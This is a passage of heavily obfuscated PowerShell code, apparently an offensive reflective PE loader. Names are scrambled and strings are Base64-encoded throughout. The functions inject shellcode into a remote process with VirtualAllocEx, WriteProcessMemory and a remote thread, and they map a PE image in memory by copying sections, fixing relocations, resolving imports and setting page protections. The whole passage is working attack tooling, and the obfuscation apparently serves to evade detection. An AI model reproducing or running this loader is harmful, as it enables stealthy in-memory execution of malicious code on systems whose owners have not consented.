			${/=\/\/\_/\____/\_} = @(0xb9)
			${/==\/\_/=\_/\/\__} = @(0x51, 0x50, 0xb8)
			${__/=\/\/\_/=\/\__} = @(0xff, 0xd0, 0xb9)
			${_/=\/\/=====\___/} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${/=====\/===\_/=\/} = ${/===\_/\_/\__/\__}.Length + ${/=\/\/\_/\____/\_}.Length + ${/==\/\_/=\_/\/\__}.Length + ${__/=\/\/\_/=\/\__}.Length + ${_/=\/\/=====\___/}.Length + (${_/=\/\/==\_/\_/==} * 4)
		${/=\/\_/=\/\___/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=====\/===\_/=\/})
		${/====\/===\/\/\/=} = ${/=\/\_/=\/\___/\/}
		______/\____/\/=\/ -___/=====\/====\/\ ${/===\_/\_/\__/\__} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/===\_/\_/\__/\__}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\/\/\/===\/\__/}, ${/=\/\_/=\/\___/\/}, $false)
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
		______/\____/\/=\/ -___/=====\/====\/\ ${/=\/\/\_/\____/\_} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/=\/\/\_/\____/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\________/=\_/}, ${/=\/\_/=\/\___/\/}, $false)
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
		______/\____/\/=\/ -___/=====\/====\/\ ${/==\/\_/=\_/\/\__} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/==\/\_/=\_/\/\__}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/\/=\__/=\___/}, ${/=\/\_/=\/\___/\/}, $false)
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
		______/\____/\/=\/ -___/=====\/====\/\ ${__/=\/\/\_/=\/\__} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${__/=\/\/\_/=\/\__}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/=\_/==\__/=\}, ${/=\/\_/=\/\___/\/}, $false)
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
		______/\____/\/=\/ -___/=====\/====\/\ ${_/=\/\/=====\___/} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
		${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/=====\___/}.Length)
		${___/==\_/====\_/\} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=====\/===\_/=\/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE)
		if (${___/==\_/====\_/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, ${/====\/===\/\/\/=}, [UIntPtr][UInt64]${/=====\/===\_/=\/}, [Ref]${/=\/==\__/\_/\__/})
		if ((${______/\/\_/=\_/\} -eq $false) -or ([UInt64]${/=\/==\__/\_/\__/} -ne [UInt64]${/=====\/===\_/=\/}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${_/\____/=\__/\/\_} = _/==\/==\__/\_____ -__/=\/\/=\__/\/==\ ${__/=\_/\___/\_/\/=} -__/\/==\_/\/==\/\/ ${___/==\_/====\_/\} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=}
		${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.WaitForSingleObject.Invoke(${_/\____/=\__/\/\_}, 20000)
		if (${/===\/==\_/\/\/\_} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${/==\/==\__/\__/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/\/==\_/\_/==})
		${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.ReadProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${_/=\/=\_/==\__/=\}, ${/==\/==\__/\__/\/}, [UIntPtr][UInt64]${_/=\/\/==\_/\_/==}, [Ref]${/=\/==\__/\_/\__/})
		if ((${/===\/==\_/\/\/\_} -eq $false) -or (${/=\/==\__/\_/\__/} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${/=\_/\/===\/\____} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/==\__/\__/\/}, [Type][IntPtr])
		${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
		${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${_/=\________/=\_/}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
		${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${_/=\/=\_/==\__/=\}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
		return ${/=\_/\/===\/\____}
	}
	Function _/===\/==\_/\/=\/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${___/==\_/\___/\/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/}
		)
		for( ${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${__/\_/=\/\/\_/=\_}++)
		{
			[IntPtr]${_/======\___/\___} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.SectionHeaderPtr) (${__/\_/=\/\/\_/=\_} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_SECTION_HEADER)))
			${__/\/=\/\/\__/\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/======\___/\___}, [Type]${_____/=\_____/\__/}.IMAGE_SECTION_HEADER)
			[IntPtr]${__/=\_/=====\__/=} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${__/\/=\/\/\__/\_/}.VirtualAddress))
			${_____/\_/=\/=\/\/} = ${__/\/=\/\/\__/\_/}.SizeOfRawData
			if (${__/\/=\/\/\__/\_/}.PointerToRawData -eq 0)
			{
				${_____/\_/=\/=\/\/} = 0
			}
			if (${_____/\_/=\/=\/\/} -gt ${__/\/=\/\/\__/\_/}.VirtualSize)
			{
				${_____/\_/=\/=\/\/} = ${__/\/=\/\/\__/\_/}.VirtualSize
			}
			if (${_____/\_/=\/=\/\/} -gt 0)
			{
				____/\__/\_/\/=\/= -__/=\/\/=\___/\___ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -__/\/==\_/\/==\/\/ ${__/=\_/=====\__/=} -_/=\_/==\/====\/=\ ${_____/\_/=\/=\/\/} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${___/==\_/\___/\/=\}, [Int32]${__/\/=\/\/\__/\_/}.PointerToRawData, ${__/=\_/=====\__/=}, ${_____/\_/=\/=\/\/})
			}
			if (${__/\/=\/\/\__/\_/}.SizeOfRawData -lt ${__/\/=\/\/\__/\_/}.VirtualSize)
			{
				${_/=\/\___/===\_/=} = ${__/\/=\/\/\__/\_/}.VirtualSize - ${_____/\_/=\/=\/\/}
				[IntPtr]${__/\/==\_/\/==\/\/} = [IntPtr](_/===\/==\/======\ ([Int64]${__/=\_/=====\__/=}) ([Int64]${_____/\_/=\/=\/\/}))
				____/\__/\_/\/=\/= -__/=\/\/=\___/\___ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -__/\/==\_/\/==\/\/ ${__/\/==\_/\/==\/\/} -_/=\_/==\/====\/=\ ${_/=\/\___/===\_/=} | Out-Null
				${_/=\/\/\/\____/\/=}.memset.Invoke(${__/\/==\_/\/==\/\/}, 0, [IntPtr]${_/=\/\___/===\_/=}) | Out-Null
			}
		}
	}
	Function __/=\/\__/=\_/\__/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/=\/==\/====\_/\/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/}
		)
		[Int64]${__/\/=====\__/===} = 0
		${__/\__/\_/=\/=\/=} = $true 
		[UInt32]${_____/=\/===\/==\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_BASE_RELOCATION)
		if ((${_/=\/==\/====\_/\/} -eq [Int64]${_/=\/====\/\/==\_/}.EffectivePEHandle) `
				-or (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((___/\/=\____/\/\_/ (${_/=\/==\/====\_/\/}) (${_/=\/====\/\/==\_/}.EffectivePEHandle)) -eq $true)
		{
			${__/\/=====\__/===} = __/=\/=\__/\/===== (${_/=\/==\/====\_/\/}) (${_/=\/====\/\/==\_/}.EffectivePEHandle)
			${__/\__/\_/=\/=\/=} = $false
		}
		elseif ((___/\/=\____/\/\_/ (${_/=\/====\/\/==\_/}.EffectivePEHandle) (${_/=\/==\/====\_/\/})) -eq $true)
		{
			${__/\/=====\__/===} = __/=\/=\__/\/===== (${_/=\/====\/\/==\_/}.EffectivePEHandle) (${_/=\/==\/====\_/\/})
		}
		[IntPtr]${___/\/=======\/==} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${___/=\/=\/\_/====} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/\/=======\/==}, [Type]${_____/=\_____/\__/}.IMAGE_BASE_RELOCATION)
			if (${___/=\/=\/\_/====}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${_/\/=\_/====\/\_/} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${___/=\/=\/\_/====}.VirtualAddress))
			${__/\_/\_/==\___/=} = (${___/=\/=\/\_/====}.SizeOfBlock - ${_____/=\/===\/==\}) / 2
			for(${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${__/\_/\_/==\___/=}; ${__/\_/=\/\/\_/=\_}++)
			{
				${__________/\_/\__} = [IntPtr](_/===\/==\/======\ ([IntPtr]${___/\/=======\/==}) ([Int64]${_____/=\/===\/==\} + (2 * ${__/\_/=\/\/\_/=\_})))
				[UInt16]${_/=\/\___/====\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__________/\_/\__}, [Type][UInt16])
				[UInt16]${/==\___/\___/\___} = ${_/=\/\___/====\__} -band 0x0FFF
				[UInt16]${__/====\__/\____/} = ${_/=\/\___/====\__} -band 0xF000
				for (${_/\/==\__/====\/\} = 0; ${_/\/==\__/====\/\} -lt 12; ${_/\/==\__/====\/\}++)
				{
					${__/====\__/\____/} = [Math]::Floor(${__/====\__/\____/} / 2)
				}
				if ((${__/====\__/\____/} -eq ${_____/\__/\/\/\/\/}.IMAGE_REL_BASED_HIGHLOW) `
						-or (${__/====\__/\____/} -eq ${_____/\__/\/\/\/\/}.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${____/=\/\/\__/\/\} = [IntPtr](_/===\/==\/======\ ([Int64]${_/\/=\_/====\/\_/}) ([Int64]${/==\___/\___/\___}))
					[IntPtr]${___/==\_/===\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/=\/\/\__/\/\}, [Type][IntPtr])
					if (${__/\__/\_/=\/=\/=} -eq $true)
					{
						[IntPtr]${___/==\_/===\/\/\} = [IntPtr](_/===\/==\/======\ ([Int64]${___/==\_/===\/\/\}) (${__/\/=====\__/===}))
					}
					else
					{
						[IntPtr]${___/==\_/===\/\/\} = [IntPtr](__/=\/=\__/\/===== ([Int64]${___/==\_/===\/\/\}) (${__/\/=====\__/===}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/==\_/===\/\/\}, ${____/=\/\/\__/\/\}, $false) | Out-Null
				}
				elseif (${__/====\__/\____/} -ne ${_____/\__/\/\/\/\/}.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAF8ALwA9AD0APQA9AFwAXwBfAC8AXABfAF8AXwBfAC8AfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwAvAD0AXAAvAFwAXwBfAF8ALwA9AD0APQA9AFwAXwBfAH0A')))
				}
			}
			${___/\/=======\/==} = [IntPtr](_/===\/==\/======\ ([Int64]${___/\/=======\/==}) ([Int64]${___/=\/=\/\_/====}.SizeOfBlock))
		}
	}
	Function _/==\____/=\_/\/\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/},
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${__/=\_/\___/\_/\/=}
		)
		${/=\_/=\/\_____/==} = $false
		if (${_/=\/====\/\/==\_/}.PEHandle -ne ${_/=\/====\/\/==\_/}.EffectivePEHandle)
		{
			${/=\_/=\/\_____/==} = $true
		}
		if (${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${_/\/\____/==\/\/\} = _/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${_/\/=\/\___/==\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\____/==\/\/\}, [Type]${_____/=\_____/\__/}.IMAGE_IMPORT_DESCRIPTOR)
				if (${_/\/=\/\___/==\__}.Characteristics -eq 0 `
						-and ${_/\/=\/\___/==\__}.FirstThunk -eq 0 `
						-and ${_/\/=\/\___/==\__}.ForwarderChain -eq 0 `
						-and ${_/\/=\/\___/==\__}.Name -eq 0 `
						-and ${_/\/=\/\___/==\__}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${_/===\_/\_/==\___} = [IntPtr]::Zero
				${__/\/===\__/\/=\__} = (_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.PEHandle) ([Int64]${_/\/=\/\___/==\__}.Name))
				${_/\_/=\_/\_/\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\/===\__/\/=\__})
				if (${/=\_/=\/\_____/==} -eq $true)
				{
					${_/===\_/\_/==\___} = __/=\/\_/==\/\__/\ -__/=\_/\___/\_/\/= ${__/=\_/\___/\_/\/=} -__/\/===\__/\/=\__ ${__/\/===\__/\/=\__}
				}
				else
				{
					${_/===\_/\_/==\___} = ${_/=\/\/\/\____/\/=}.LoadLibrary.Invoke(${_/\_/=\_/\_/\/==\})
				}
				if ((${_/===\_/\_/==\___} -eq $null) -or (${_/===\_/\_/==\___} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AF8ALwBcAF8ALwA9AFwAXwAvAFwAXwAvAFwALwA9AD0AXAB9AA==')))
				}
				[IntPtr]${___/==\/\/=\_/\/\} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/\/=\/\___/==\__}.FirstThunk)
				[IntPtr]${____/\/=\/\__/\/\} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/\/=\/\___/==\__}.Characteristics) 
				[IntPtr]${_/=\/=\____/=\/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/\/=\/\__/\/\}, [Type][IntPtr])
				while (${_/=\/=\____/=\/==} -ne [IntPtr]::Zero)
				{
					${__/\__/\_/===\__/} = ''
					[IntPtr]${_/==\/=\___/=\/\_} = [IntPtr]::Zero
					if([Int64]${_/=\/=\____/=\/==} -lt 0)
					{
						${__/\__/\_/===\__/} = [Int64]${_/=\/=\____/=\/==} -band 0xffff 
					}
					else
					{
						[IntPtr]${__/\/==\/=\/=====} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${_/=\/=\____/=\/==})
						${__/\/==\/=\/=====} = _/===\/==\/======\ ${__/\/==\/=\/=====} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${__/\__/\_/===\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\/==\/=\/=====})
					}
					if (${/=\_/=\/\_____/==} -eq $true)
					{
						[IntPtr]${_/==\/=\___/=\/\_} = _/==\/\/\_/===\/=\ -__/=\_/\___/\_/\/= ${__/=\_/\___/\_/\/=} -__/\/\/\/===\/\__/ ${_/===\_/\_/==\___} -______/\__/=\/\_/\ ${__/\__/\_/===\__/}
					}
					else
					{
						[IntPtr]${_/==\/=\___/=\/\_} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_/===\_/\_/==\___}, ${__/\__/\_/===\__/})
					}
					if (${_/==\/=\___/=\/\_} -eq $null -or ${_/==\/=\___/=\/\_} -eq [IntPtr]::Zero)
					{
						Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAF8ALwBcAF8AXwAvAFwAXwAvAD0APQA9AFwAXwBfAC8AfQAuACAARABsAGwAOgAgACQAewBfAC8AXABfAC8APQBcAF8ALwBcAF8ALwBcAC8APQA9AFwAfQA=')))
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\/=\___/=\/\_}, ${___/==\/\/=\_/\/\}, $false)
					${___/==\/\/=\_/\/\} = _/===\/==\/======\ ([Int64]${___/==\/\/=\_/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${____/\/=\/\__/\/\} = _/===\/==\/======\ ([Int64]${____/\/=\/\__/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${_/=\/=\____/=\/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/\/=\/\__/\/\}, [Type][IntPtr])
				}
				${_/\/\____/==\/\/\} = _/===\/==\/======\ (${_/\/\____/==\/\/\}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function ___/===\__/=\__/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${_/=\_/\/=\/=\_/=\/}
		)
		${__/=\_/=\/\/=\__/} = 0x0
		if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_READWRITE
				}
				else
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_READONLY
				}
			}
			else
			{
				if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_WRITECOPY
				}
				else
				{
					${__/=\_/=\/\/=\__/} = ${_____/\__/\/\/\/\/}.PAGE_NOACCESS
				}
			}
		}
		if ((${_/=\_/\/=\/=\_/=\/} -band ${_____/\__/\/\/\/\/}.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${__/=\_/=\/\/=\__/} = ${__/=\_/=\/\/=\__/} -bor ${_____/\__/\/\/\/\/}.PAGE_NOCACHE
		}
		return ${__/=\_/=\/\/=\__/}
	}
	Function __/\/\_/\/\_/====\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/}
		)
		for( ${__/\_/=\/\/\_/=\_} = 0; ${__/\_/=\/\/\_/=\_} -lt ${_/=\/====\/\/==\_/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${__/\_/=\/\/\_/=\_}++)
		{
			[IntPtr]${_/======\___/\___} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.SectionHeaderPtr) (${__/\_/=\/\/\_/=\_} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_SECTION_HEADER)))
			${__/\/=\/\/\__/\_/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/======\___/\___}, [Type]${_____/=\_____/\__/}.IMAGE_SECTION_HEADER)
			[IntPtr]${_/==\/====\/\/\/\} = _/===\/==\/======\ (${_/=\/====\/\/==\_/}.PEHandle) (${__/\/=\/\/\__/\_/}.VirtualAddress)
			[UInt32]${__/\/\/\_/=\_/\_/} = ___/===\__/=\__/== ${__/\/=\/\/\__/\_/}.Characteristics
			[UInt32]${/=\/==\/====\/=\/} = ${__/\/=\/\/\__/\_/}.VirtualSize
			[UInt32]${__/====\/===\/\__} = 0
			____/\__/\_/\/=\/= -__/=\/\/=\___/\___ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -_/=\/====\/\/==\_/ ${_/=\/====\/\/==\_/} -__/\/==\_/\/==\/\/ ${_/==\/====\/\/\/\} -_/=\_/==\/====\/=\ ${/=\/==\/====\/=\/} | Out-Null
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualProtect.Invoke(${_/==\/====\/\/\/\}, ${/=\/==\/====\/=\/}, ${__/\/\/\_/=\_/\_/}, [Ref]${__/====\/===\/\__})
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function _/=\/\_/=\_/=\___/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_/=\/====\/\/==\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_/=\/\/\/\____/\/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${___/=\_/\/\__/=\__},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${__/====\_/\__/\__/}
		)
		${___/==\_/\_/==\_/} = @() 
		${_/=\/\/==\_/\_/==} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${__/====\/===\/\__} = 0
		[IntPtr]${_____/==\/\_/\_/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${_____/==\/\_/\_/=} -eq [IntPtr]::Zero)
		{
